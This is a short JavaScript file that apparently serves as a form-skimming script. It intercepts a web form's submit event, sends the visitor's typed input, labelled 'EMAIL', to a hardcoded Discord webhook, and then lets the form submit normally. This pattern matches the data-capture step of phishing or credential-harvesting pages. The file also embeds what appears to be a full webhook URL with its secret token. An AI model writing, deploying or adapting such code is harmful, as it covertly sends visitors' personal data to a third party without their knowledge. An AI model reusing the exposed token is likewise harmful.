"use strict";

function sendMessageToWebhook(webhookURL, message) {
    const payload = {
        content: "```\n----------------------------------------------\nEMAIL: " + message + "\n----------------------------------------------```"

    };

    return fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    });
}

document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('form1'); // Change ID as needed
    const webhookURL = 'https://discord.com/api/webhooks/1249969764642721853/Srph1bGunL-AKG8WgVaJ1bUzdQ6E6yZ7Eyz-kTWW3HHWKzOHBKZcjdI7S5bzQpQnv7dU';
    
    let formSubmitted = false; // Flag to track form submission

    form.addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent default form submission
        
        if (formSubmitted) {
            return; // Exit early if form already submitted
        }
        formSubmitted = true; // Set flag to true

        const input = document.getElementById('input1'); // Change ID as needed
        const inputText = input.value;

        sendMessageToWebhook(webhookURL, inputText)
            .then(response => {
                if (response.ok) {
                    console.log('Message sent successfully');
                    // Proceed with form submission
                    form.submit();
                } else {
                    response.text().then(text => {
                        console.error('Error sending message:', text);
                    });
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
    });
});
